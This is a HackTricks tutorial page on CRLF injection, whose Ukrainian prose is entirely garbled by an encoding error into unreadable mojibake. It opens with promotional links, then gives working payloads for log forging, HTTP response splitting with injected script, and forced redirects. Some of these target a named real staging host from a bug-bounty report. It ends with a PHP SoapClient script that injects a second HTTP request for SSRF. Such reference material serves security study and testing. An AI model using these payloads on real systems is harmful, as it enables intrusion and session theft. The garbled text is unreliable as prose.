# –í–ø—Ä–æ–≤–∞–¥–∂–µ–Ω–Ω—è CRLF (%0D%0A)

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é –≤ —Ä–µ–∫–ª–∞–º—ñ –Ω–∞ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) **—ñ** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **—Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ GitHub**.

</details>

<figure><img src="../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**–ü—ñ–¥–∫–∞–∑–∫–∞ —â–æ–¥–æ –±–∞–≥—ñ–≤ —É –≤–∏–Ω–∞–≥–æ—Ä–æ–¥—É**: **–∑–∞—Ä–µ—î—Å—Ç—Ä—É–π—Ç–µ—Å—è** –Ω–∞ **Intigriti**, –ø—Ä–µ–º—ñ–∞–ª—å–Ω—ñ–π **–ø–ª–∞—Ç—Ñ–æ—Ä–º—ñ –¥–ª—è –ø–æ—à—É–∫—É –±–∞–≥—ñ–≤, —Å—Ç–≤–æ—Ä–µ–Ω—ñ–π —Ö–∞–∫–µ—Ä–∞–º–∏ –¥–ª—è —Ö–∞–∫–µ—Ä—ñ–≤**! –ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ –Ω–∞—Å –Ω–∞ [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) —Å—å–æ–≥–æ–¥–Ω—ñ, —ñ –ø–æ—á–Ω—ñ—Ç—å –∑–∞—Ä–æ–±–ª—è—Ç–∏ –≤–∏–Ω–∞–≥–æ—Ä–æ–¥–∏ –¥–æ **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

### CRLF

–ü–æ–≤–µ—Ä–Ω–µ–Ω–Ω—è –∫–∞—Ä–µ—Ç–∫–∏ (CR) —Ç–∞ –ø–µ—Ä–µ–≤–µ–¥–µ–Ω–Ω—è —Ä—è–¥–∫–∞ (LF), –≤—ñ–¥–æ–º—ñ —Ä–∞–∑–æ–º —è–∫ CRLF, - —Ü–µ —Å–ø–µ—Ü—ñ–∞–ª—å–Ω—ñ –ø–æ—Å–ª—ñ–¥–æ–≤–Ω–æ—Å—Ç—ñ —Å–∏–º–≤–æ–ª—ñ–≤, —è–∫—ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è –≤ –ø—Ä–æ—Ç–æ–∫–æ–ª—ñ HTTP –¥–ª—è –ø–æ–∑–Ω–∞—á–µ–Ω–Ω—è –∫—ñ–Ω—Ü—è —Ä—è–¥–∫–∞ –∞–±–æ –ø–æ—á–∞—Ç–∫—É –Ω–æ–≤–æ–≥–æ. –í–µ–±-—Å–µ—Ä–≤–µ—Ä–∏ —Ç–∞ –±—Ä–∞—É–∑–µ—Ä–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å CRLF –¥–ª—è —Ä–æ–∑—Ä—ñ–∑–Ω–µ–Ω–Ω—è –º—ñ–∂ –∑–∞–≥–æ–ª–æ–≤–∫–∞–º–∏ HTTP —Ç–∞ —Ç—ñ–ª–æ–º –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ. –¶—ñ —Å–∏–º–≤–æ–ª–∏ —É–Ω—ñ–≤–µ—Ä—Å–∞–ª—å–Ω–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è –≤ –∫–æ–º—É–Ω—ñ–∫–∞—Ü—ñ—è—Ö HTTP/1.1 –Ω–∞ —Ä—ñ–∑–Ω–∏—Ö —Ç–∏–ø–∞—Ö –≤–µ–±-—Å–µ—Ä–≤–µ—Ä—ñ–≤, —Ç–∞–∫–∏—Ö —è–∫ Apache —Ç–∞ Microsoft IIS.

### –£—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –≤–ø—Ä–æ–≤–∞–¥–∂–µ–Ω–Ω—è CRLF

–í–ø—Ä–æ–≤–∞–¥–∂–µ–Ω–Ω—è CRLF –ø–µ—Ä–µ–¥–±–∞—á–∞—î –≤—Å—Ç–∞–≤–∫—É —Å–∏–º–≤–æ–ª—ñ–≤ CR —Ç–∞ LF —É –≤–≤–µ–¥–µ–Ω–Ω—è, –Ω–∞–¥–∞–Ω–µ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º. –¶—è –¥—ñ—è –≤–≤–æ–¥–∏—Ç—å –≤ –æ–º–∞–Ω—É —Å–µ—Ä–≤–µ—Ä, –¥–æ–¥–∞—Ç–æ–∫ –∞–±–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, —â–æ–± —ñ–Ω—Ç–µ—Ä–ø—Ä–µ—Ç—É–≤–∞—Ç–∏ –≤–ø—Ä–æ–≤–∞–¥–∂–µ–Ω—É –ø–æ—Å–ª—ñ–¥–æ–≤–Ω—ñ—Å—Ç—å —è–∫ –∫—ñ–Ω–µ—Ü—å –æ–¥–Ω—ñ—î—ó –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ —Ç–∞ –ø–æ—á–∞—Ç–æ–∫ —ñ–Ω—à–æ—ó. –•–æ—á–∞ —Ü—ñ —Å–∏–º–≤–æ–ª–∏ –Ω–µ —î —à–∫—ñ–¥–ª–∏–≤–∏–º–∏ –≤ —Å–æ–±—ñ, —ó—Ö –Ω–µ–¥–æ—Ä–µ—á–Ω–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –º–æ–∂–µ –ø—Ä–∏–∑–≤–µ—Å—Ç–∏ –¥–æ —Ä–æ–∑–¥—ñ–ª–µ–Ω–Ω—è –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ HTTP —Ç–∞ —ñ–Ω—à–∏—Ö –∑–ª–æ–≤–º–∏—Å–Ω–∏—Ö –¥—ñ–π.

### –ü—Ä–∏–∫–ª–∞–¥: –í–ø—Ä–æ–≤–∞–¥–∂–µ–Ω–Ω—è CRLF —É —Ñ–∞–π–ª –∂—É—Ä–Ω–∞–ª—É

[–ü—Ä–∏–∫–ª–∞–¥ –∑–≤—ñ–¥—Å–∏](https://www.invicti.com/blog/web-security/crlf-http-header/)

–ü—Ä–∏–ø—É—Å—Ç–∏–º–æ, —â–æ —É —Ñ–∞–π–ª—ñ –∂—É—Ä–Ω–∞–ª—É –≤ –ø–∞–Ω–µ–ª—ñ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞ –¥–æ—Ç—Ä–∏–º—É—î—Ç—å—Å—è —Ñ–æ—Ä–º–∞—Ç: `IP - –ß–∞—Å - –®–ª—è—Ö –≤—ñ–¥–≤—ñ–¥—É–≤–∞–Ω–Ω—è`. –¢–∏–ø–æ–≤–∏–π –∑–∞–ø–∏—Å –º–æ–∂–µ –≤–∏–≥–ª—è–¥–∞—Ç–∏ –Ω–∞—Å—Ç—É–ø–Ω–∏–º —á–∏–Ω–æ–º:
```
123.123.123.123 - 08:15 - /index.php?page=home
```
–ê—Ç–∞–∫—É–≤–∞–ª—å–Ω–∏–∫ –º–æ–∂–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å CRLF —ñ–Ω'—î–∫—Ü—ñ—ó, —â–æ–± –º–∞–Ω—ñ–ø—É–ª—é–≤–∞—Ç–∏ —Ü–∏–º –∂—É—Ä–Ω–∞–ª–æ–º. –í—Å—Ç–∞–≤–ª—è—é—á–∏ —Å–∏–º–≤–æ–ª–∏ CRLF —É HTTP-–∑–∞–ø–∏—Ç, –∞—Ç–∞–∫—É–≤–∞–ª—å–Ω–∏–∫ –º–æ–∂–µ –∑–º—ñ–Ω–∏—Ç–∏ –≤–∏—Ö—ñ–¥–Ω–∏–π –ø–æ—Ç—ñ–∫ —Ç–∞ –≤–∏–≥–æ—Ç–æ–≤–∏—Ç–∏ –∑–∞–ø–∏—Å–∏ –≤ –∂—É—Ä–Ω–∞–ª—ñ. –ù–∞–ø—Ä–∏–∫–ª–∞–¥, –≤—Å—Ç–∞–≤–ª–µ–Ω–∞ –ø–æ—Å–ª—ñ–¥–æ–≤–Ω—ñ—Å—Ç—å –º–æ–∂–µ –ø–µ—Ä–µ—Ç–≤–æ—Ä–∏—Ç–∏ –∑–∞–ø–∏—Å —É –∂—É—Ä–Ω–∞–ª—ñ –Ω–∞:
```
/index.php?page=home&%0d%0a127.0.0.1 - 08:15 - /index.php?page=home&restrictedaction=edit
```
–¢—É—Ç `%0d` —Ç–∞ `%0a` –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è—é—Ç—å —Å–æ–±–æ—é –∑–∞–∫–æ–¥–æ–≤–∞–Ω—ñ —É —Ñ–æ—Ä–º–∞—Ç—ñ URL —Å–∏–º–≤–æ–ª–∏ CR —Ç–∞ LF. –ü—ñ—Å–ª—è –∞—Ç–∞–∫–∏, –∂—É—Ä–Ω–∞–ª –≤–∏–≤–µ–¥–µ –Ω–µ–ø—Ä–∞–≤–¥–∏–≤—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é:
```
IP - Time - Visited Path

123.123.123.123 - 08:15 - /index.php?page=home&
127.0.0.1 - 08:15 - /index.php?page=home&restrictedaction=edit
```
–ê—Ç–∞–∫—É—é—á–∏–π –ø—Ä–∏—Ö–æ–≤—É—î —Å–≤–æ—é –∑–ª–æ–≤–º–∏—Å–Ω—É –¥—ñ—è–ª—å–Ω—ñ—Å—Ç—å, –∑—Ä–æ–±–∏–≤—à–∏ —Ç–∞–∫, —â–æ –ª–æ–∫–∞–ª—å–Ω–∏–π —Ö–æ—Å—Ç (—Å—É—Ç–Ω—ñ—Å—Ç—å, —è–∫—ñ–π –∑–∞–∑–≤–∏—á–∞–π –¥–æ–≤—ñ—Ä—è—é—Ç—å —É —Å–µ—Ä–µ–¥–æ–≤–∏—â—ñ —Å–µ—Ä–≤–µ—Ä–∞) –≤–∏–∫–æ–Ω–∞–≤ –¥—ñ—ó. –°–µ—Ä–≤–µ—Ä —ñ–Ω—Ç–µ—Ä–ø—Ä–µ—Ç—É—î —á–∞—Å—Ç–∏–Ω—É –∑–∞–ø–∏—Ç—É, —â–æ –ø–æ—á–∏–Ω–∞—î—Ç—å—Å—è –∑ `%0d%0a`, —è–∫ –æ–¥–∏–Ω –ø–∞—Ä–∞–º–µ—Ç—Ä, —Ç–æ–¥—ñ —è–∫ –ø–∞—Ä–∞–º–µ—Ç—Ä `restrictedaction` —Ä–æ–∑–±–∏—Ä–∞—î—Ç—å—Å—è —è–∫ —ñ–Ω—à–∏–π, –æ–∫—Ä–µ–º–∏–π –≤–≤—ñ–¥. –ó–º—ñ–Ω–µ–Ω–∏–π –∑–∞–ø–∏—Ç –µ—Ñ–µ–∫—Ç–∏–≤–Ω–æ —ñ–º—ñ—Ç—É—î –∑–∞–∫–æ–Ω–Ω—É –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–∏–≤–Ω—É –∫–æ–º–∞–Ω–¥—É: `/index.php?page=home&restrictedaction=edit`

### –†–æ–∑–¥—ñ–ª–µ–Ω–Ω—è HTTP-–≤—ñ–¥–ø–æ–≤—ñ–¥—ñ

#### –û–ø–∏—Å

–†–æ–∑–¥—ñ–ª–µ–Ω–Ω—è HTTP-–≤—ñ–¥–ø–æ–≤—ñ–¥—ñ - —Ü–µ —É—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –±–µ–∑–ø–µ–∫–∏, —è–∫–∞ –≤–∏–Ω–∏–∫–∞—î, –∫–æ–ª–∏ –∞—Ç–∞–∫—É—é—á–∏–π –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î —Å—Ç—Ä—É–∫—Ç—É—Ä—É HTTP-–≤—ñ–¥–ø–æ–≤—ñ–¥–µ–π. –¶—è —Å—Ç—Ä—É–∫—Ç—É—Ä–∞ —Ä–æ–∑–¥—ñ–ª—è—î –∑–∞–≥–æ–ª–æ–≤–∫–∏ –≤—ñ–¥ —Ç—ñ–ª–∞ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ—ó –ø–æ—Å–ª—ñ–¥–æ–≤–Ω–æ—Å—Ç—ñ —Å–∏–º–≤–æ–ª—ñ–≤: —Å–∏–º–≤–æ–ª –ø–æ–≤–µ—Ä–Ω–µ–Ω–Ω—è –∫–∞—Ä–µ—Ç–∫–∏ (CR), –∑–∞ —è–∫–∏–º —Å–ª—ñ–¥—É—î –ø–µ—Ä–µ—Ö—ñ–¥ –Ω–∞ –Ω–æ–≤–∏–π —Ä—è–¥–æ–∫ (LF), —è–∫—ñ —Ä–∞–∑–æ–º –Ω–∞–∑–∏–≤–∞—é—Ç—å—Å—è CRLF. –Ø–∫—â–æ –∞—Ç–∞–∫—É—é—á–∏–π –≤–¥–∞—î—Ç—å—Å—è –≤—Å—Ç–∞–≤–∏—Ç–∏ –ø–æ—Å–ª—ñ–¥–æ–≤–Ω—ñ—Å—Ç—å CRLF —É –∑–∞–≥–æ–ª–æ–≤–æ–∫ –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ, –≤—ñ–Ω –º–æ–∂–µ –µ—Ñ–µ–∫—Ç–∏–≤–Ω–æ –º–∞–Ω—ñ–ø—É–ª—é–≤–∞—Ç–∏ –Ω–∞—Å—Ç—É–ø–Ω–∏–º –≤–º—ñ—Å—Ç–æ–º –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ. –¶–µ–π —Ç–∏–ø –º–∞–Ω—ñ–ø—É–ª—è—Ü—ñ—ó –º–æ–∂–µ –ø—Ä–∏–∑–≤–µ—Å—Ç–∏ –¥–æ —Å–µ—Ä–π–æ–∑–Ω–∏—Ö –ø—Ä–æ–±–ª–µ–º –±–µ–∑–ø–µ–∫–∏, –∑–æ–∫—Ä–µ–º–∞ –º—ñ–∂—Å–∞–π—Ç–æ–≤–æ–≥–æ —Å–∫—Ä–∏–ø—Ç—ñ–Ω–≥—É (XSS).

#### XSS —á–µ—Ä–µ–∑ —Ä–æ–∑–¥—ñ–ª–µ–Ω–Ω—è HTTP-–≤—ñ–¥–ø–æ–≤—ñ–¥—ñ

1. –î–æ–¥–∞—Ç–æ–∫ –≤—Å—Ç–∞–Ω–æ–≤–ª—é—î –≤–ª–∞—Å–Ω–∏–π –∑–∞–≥–æ–ª–æ–≤–æ–∫ —Ç–∞–∫–∏–º —á–∏–Ω–æ–º: `X-Custom-Header: UserInput`
2. –î–æ–¥–∞—Ç–æ–∫ –æ—Ç—Ä–∏–º—É—î –∑–Ω–∞—á–µ–Ω–Ω—è –¥–ª—è `UserInput` –∑ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞ –∑–∞–ø–∏—Ç—É, —Å–∫–∞–∂—ñ–º–æ, "user\_input". –£ –≤–∏–ø–∞–¥–∫–∞—Ö, –∫–æ–ª–∏ –≤—ñ–¥—Å—É—Ç–Ω—è –Ω–∞–ª–µ–∂–Ω–∞ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∞ –≤–≤–µ–¥–µ–Ω–Ω—è —Ç–∞ –∫–æ–¥—É–≤–∞–Ω–Ω—è, –∞—Ç–∞–∫—É—é—á–∏–π –º–æ–∂–µ —Å—Ç–≤–æ—Ä–∏—Ç–∏ –ø–æ–ª–µ–∑–Ω–µ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è, —è–∫–µ –≤–∫–ª—é—á–∞—î –ø–æ—Å–ª—ñ–¥–æ–≤–Ω—ñ—Å—Ç—å CRLF, –∑–∞ —è–∫–æ—é —Å–ª—ñ–¥—É—î –∑–ª–æ–≤–º–∏—Å–Ω–∏–π –≤–º—ñ—Å—Ç.
3. –ê—Ç–∞–∫—É—é—á–∏–π —Å—Ç–≤–æ—Ä—é—î URL –∑ –æ—Å–æ–±–ª–∏–≤–æ —Å—Ç–≤–æ—Ä–µ–Ω–∏–º 'user\_input': `?user_input=Value%0d%0a%0d%0a<script>alert('XSS')</script>`
* –£ —Ü—å–æ–º—É URL `%0d%0a%0d%0a` - —Ü–µ URL-–∫–æ–¥–æ–≤–∞–Ω–∞ —Ñ–æ—Ä–º–∞ CRLFCRLF. –¶–µ –∑–º—É—à—É—î —Å–µ—Ä–≤–µ—Ä –≤—Å—Ç–∞–≤–∏—Ç–∏ –ø–æ—Å–ª—ñ–¥–æ–≤–Ω—ñ—Å—Ç—å CRLF, —â–æ —Ä–æ–±–∏—Ç—å —Ç–∞–∫, —â–æ —Å–µ—Ä–≤–µ—Ä —Ä–æ–∑–≥–ª—è–¥–∞—î –Ω–∞—Å—Ç—É–ø–Ω—É —á–∞—Å—Ç–∏–Ω—É —è–∫ —Ç—ñ–ª–æ –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ.
4. –°–µ—Ä–≤–µ—Ä –≤—ñ–¥–æ–±—Ä–∞–∂–∞—î –≤–≤–µ–¥–µ–Ω–Ω—è –∞—Ç–∞–∫—É—é—á–æ–≥–æ —É –∑–∞–≥–æ–ª–æ–≤–∫—É –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ, —â–æ –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ –Ω–µ–ø–µ—Ä–µ–¥–±–∞—á–µ–Ω–æ—ó —Å—Ç—Ä—É–∫—Ç—É—Ä–∏ –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ, –¥–µ –∑–ª–æ–≤–º–∏—Å–Ω–∏–π —Å–∫—Ä–∏–ø—Ç —ñ–Ω—Ç–µ—Ä–ø—Ä–µ—Ç—É—î—Ç—å—Å—è –±—Ä–∞—É–∑–µ—Ä–æ–º —è–∫ —á–∞—Å—Ç–∏–Ω–∞ —Ç—ñ–ª–∞ –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ.

#### –ü—Ä–∏–∫–ª–∞–¥ —Ä–æ–∑–¥—ñ–ª–µ–Ω–Ω—è HTTP-–≤—ñ–¥–ø–æ–≤—ñ–¥—ñ, —â–æ –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—è

–ó [https://medium.com/bugbountywriteup/bugbounty-exploiting-crlf-injection-can-lands-into-a-nice-bounty-159525a9cb62](https://medium.com/bugbountywriteup/bugbounty-exploiting-crlf-injection-can-lands-into-a-nice-bounty-159525a9cb62)

–ü–µ—Ä–µ—Ö—ñ–¥ –¥–æ –±—Ä–∞—É–∑–µ—Ä–∞:
```
/%0d%0aLocation:%20http://myweb.com
```
–Ü —Å–µ—Ä–≤–µ—Ä –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—î –∑–∞–≥–æ–ª–æ–≤–∫–æ–º:
```
Location: http://myweb.com
```
**–Ü–Ω—à–∏–π –ø—Ä–∏–∫–ª–∞–¥: (–∑** [**https://www.acunetix.com/websitesecurity/crlf-injection/**](https://www.acunetix.com/websitesecurity/crlf-injection/)**)**
```
http://www.example.com/somepage.php?page=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E
```
#### –£ —à–ª—è—Ö—É URL

–í–∏ –º–æ–∂–µ—Ç–µ –≤—ñ–¥–ø—Ä–∞–≤–∏—Ç–∏ –ø–æ–ª–µ–∑–Ω–µ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è **–≤ —Å–µ—Ä–µ–¥–∏–Ω—ñ —à–ª—è—Ö—É URL**, —â–æ–± –∫–æ–Ω—Ç—Ä–æ–ª—é–≤–∞—Ç–∏ **–≤—ñ–¥–ø–æ–≤—ñ–¥—å** –≤—ñ–¥ —Å–µ—Ä–≤–µ—Ä–∞ (–ø—Ä–∏–∫–ª–∞–¥ –∑ [—Ç—É—Ç](https://hackerone.com/reports/192667)):
```
http://stagecafrstore.starbucks.com/%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E
http://stagecafrstore.starbucks.com/%3f%0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3a0%0D%0A%0D%0A%3Cscript%3Ealert(document.domain)%3C/script%3E
```
–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –±—ñ–ª—å—à–µ –ø—Ä–∏–∫–ª–∞–¥—ñ–≤ –∑–∞ –ø–æ—Å–∏–ª–∞–Ω–Ω—è–º:

{% embed url="https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/crlf.md" %}

### –í–Ω–µ–¥—Ä–µ–Ω–Ω—è HTTP-–∑–∞–≥–æ–ª–æ–≤–∫—ñ–≤

–í–Ω–µ–¥—Ä–µ–Ω–Ω—è HTTP-–∑–∞–≥–æ–ª–æ–≤–∫—ñ–≤, —á–∞—Å—Ç–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è —á–µ—Ä–µ–∑ –≤–Ω–µ–¥—Ä–µ–Ω–Ω—è CRLF (–ø–µ—Ä–µ—Ö—ñ–¥ –∫–∞—Ä–µ—Ç–∫–∏ —Ç–∞ –ø–µ—Ä–µ–Ω–æ—Å—É —Ä—è–¥–∫–∞), –¥–æ–∑–≤–æ–ª—è—î –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞–º –≤—Å—Ç–∞–≤–ª—è—Ç–∏ HTTP-–∑–∞–≥–æ–ª–æ–≤–∫–∏. –¶–µ –º–æ–∂–µ –ø—ñ–¥—ñ—Ä–≤–∞—Ç–∏ –º–µ—Ö–∞–Ω—ñ–∑–º–∏ –±–µ–∑–ø–µ–∫–∏, —Ç–∞–∫—ñ —è–∫ —Ñ—ñ–ª—å—Ç—Ä–∏ XSS (–º—ñ–∂—Å–∞–π—Ç–æ–≤–∏–π —Å–∫—Ä–∏–ø—Ç–∏–Ω–≥) –∞–±–æ SOP (–ø–æ–ª—ñ—Ç–∏–∫–∞ –æ–¥–Ω–∞–∫–æ–≤–æ–≥–æ –ø–æ—Ö–æ–¥–∂–µ–Ω–Ω—è), —â–æ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –º–æ–∂–µ –ø—Ä–∏–∑–≤–µ—Å—Ç–∏ –¥–æ –Ω–µ—Å–∞–Ω–∫—Ü—ñ–æ–Ω–æ–≤–∞–Ω–æ–≥–æ –¥–æ—Å—Ç—É–ø—É –¥–æ —á—É—Ç–ª–∏–≤–∏—Ö –¥–∞–Ω–∏—Ö, —Ç–∞–∫–∏—Ö —è–∫ —Ç–æ–∫–µ–Ω–∏ CSRF, –∞–±–æ –º–∞–Ω—ñ–ø—É–ª—é–≤–∞–Ω–Ω—è —Å–µ–∞–Ω—Å–∞–º–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ —á–µ—Ä–µ–∑ –≤–Ω–µ—Å–µ–Ω–Ω—è –∫—É–∫—ñ.

#### –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è CORS —á–µ—Ä–µ–∑ –≤–Ω–µ–¥—Ä–µ–Ω–Ω—è HTTP-–∑–∞–≥–æ–ª–æ–≤–∫—ñ–≤

–ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –≤–Ω–µ—Å—Ç–∏ HTTP-–∑–∞–≥–æ–ª–æ–≤–∫–∏ –¥–ª—è –∞–∫—Ç–∏–≤–∞—Ü—ñ—ó CORS (—Å–ø—ñ–ª—å–Ω–∏–π –æ–±–º—ñ–Ω —Ä–µ—Å—É—Ä—Å–∞–º–∏ –º—ñ–∂ –ø–æ—Ö–æ–¥–∂–µ–Ω–Ω—è–º–∏), –æ–±—Ö—ñ–¥ –æ–±–º–µ–∂–µ–Ω—å, –Ω–∞–∫–ª–∞–¥–µ–Ω–∏—Ö SOP. –¶–µ –ø–æ—Ä—É—à–µ–Ω–Ω—è –¥–æ–∑–≤–æ–ª—è—î —Å—Ü–µ–Ω–∞—Ä—ñ—è–º –∑—ñ –∑–ª–æ–≤–º–∏—Å–Ω–∏—Ö –¥–∂–µ—Ä–µ–ª –≤–∑–∞—î–º–æ–¥—ñ—è—Ç–∏ –∑ —Ä–µ—Å—É—Ä—Å–∞–º–∏ –∑ —ñ–Ω—à–æ–≥–æ –ø–æ—Ö–æ–¥–∂–µ–Ω–Ω—è, —â–æ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –¥–∞—î –¥–æ—Å—Ç—É–ø –¥–æ –∑–∞—Ö–∏—â–µ–Ω–∏—Ö –¥–∞–Ω–∏—Ö.

#### SSRF —Ç–∞ –≤–Ω–µ–¥—Ä–µ–Ω–Ω—è HTTP-–∑–∞–ø–∏—Ç—É —á–µ—Ä–µ–∑ CRLF

–í–Ω–µ–¥—Ä–µ–Ω–Ω—è CRLF –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–µ –¥–ª—è —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è —Ç–∞ –≤–Ω–µ–¥—Ä–µ–Ω–Ω—è –∑–æ–≤—Å—ñ–º –Ω–æ–≤–æ–≥–æ HTTP-–∑–∞–ø–∏—Ç—É. –ü—Ä–∏–∫–ª–∞–¥–æ–º —Ü—å–æ–≥–æ —î –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –≤ –∫–ª–∞—Å—ñ `SoapClient` PHP, –∑–æ–∫—Ä–µ–º–∞ –≤ –ø–∞—Ä–∞–º–µ—Ç—Ä—ñ `user_agent`. –®–ª—è—Ö–æ–º –º–∞–Ω—ñ–ø—É–ª—é–≤–∞–Ω–Ω—è —Ü–∏–º –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–º –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –≤—Å—Ç–∞–≤–∏—Ç–∏ –¥–æ–¥–∞—Ç–∫–æ–≤—ñ –∑–∞–≥–æ–ª–æ–≤–∫–∏ —Ç–∞ —Ç—ñ–ª–æ –≤–º—ñ—Å—Ç—É, –∞–±–æ –Ω–∞–≤—ñ—Ç—å –≤–Ω–µ—Å—Ç–∏ –∑–æ–≤—Å—ñ–º –Ω–æ–≤–∏–π HTTP-–∑–∞–ø–∏—Ç. –ù–∏–∂—á–µ –Ω–∞–≤–µ–¥–µ–Ω–æ –ø—Ä–∏–∫–ª–∞–¥ PHP, —â–æ –¥–µ–º–æ–Ω—Å—Ç—Ä—É—î —Ü–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è:
```php
$target = 'http://127.0.0.1:9090/test';
$post_string = 'variable=post value';
$crlf = array(
'POST /proxy HTTP/1.1',
'Host: local.host.htb',
'Cookie: PHPSESSID=[PHPSESSID]',
'Content-Type: application/x-www-form-urlencoded',
'Content-Length: '.(string)strlen($post_string),
"\r\n",
$post_string
);

$client = new SoapClient(null,
array(
'uri'=>$target,
'location'=>$target,
'user_agent'=>"IGN\r\n\r\n".join("\r\n",$crlf)
)
);

# Put a netcat listener on port 9090
$client->__soapCall("test", []);
```
